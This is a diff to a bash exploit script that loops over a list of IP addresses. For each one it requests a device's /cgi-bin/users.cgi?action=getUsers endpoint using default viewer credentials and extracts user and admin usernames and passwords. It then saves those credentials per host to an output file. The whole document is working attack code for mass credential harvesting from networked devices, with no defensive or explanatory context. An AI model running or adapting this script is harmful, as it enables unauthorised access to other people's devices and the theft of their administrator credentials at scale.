@@ -1,5 +1,4 @@
 #!/bin/bash
-set -e
 
 echo "______      _                _       _ _   "
 echo "| ___ \    (_)              | |     (_) |  "
@@ -17,9 +16,15 @@ function check-ip {
         try-exploit $1 | grep -o -E '(userna.*|passwo.*)'
         echo ""
     else
-        echo "$1;" | tr -d '\n' >> "$OUTPUT" 2>&1
-        try-exploit $1 | cut -d= -f2 | sed '/admin/a:' | tr -d '\n' >> "$OUTPUT" 2>&1
-        echo "" >> "$OUTPUT" 2>&1
+        RESULT="$(curl -s --fail --max-time 5 "http://$1/cgi-bin/users.cgi?action=getUsers" -u "viewer:viewer" \
+        | grep -E '(User1.username|User1.password)')"
+        if [ $? == 0 ] 
+        then
+            echo "$1;" | tr -d '\n' >> "$OUTPUT" 2>&1
+            echo "$RESULT" | cut -d= -f2 | sed '/admin/a:' | tr -d '\n' >> "$OUTPUT" 2>&1
+            echo "" >> "$OUTPUT" 2>&1
+        fi
+
     fi
 }
 
@@ -73,7 +78,7 @@ else
     lines="$(wc -l $READ_FILE | tr -dc '[:alnum:]\n\r' | sed 's/[^0-9]*//g')"
     while read ip; do
         let x++ || true # exits script otherwise
-        echo "Working on IP $ip ($x/$lines)..."
+        echo "Working on IP $ip ($x/$lines)"
         check-ip $ip
     done <$READ_FILE
     printf "\nDONE! Saved to $OUTPUT!\n"
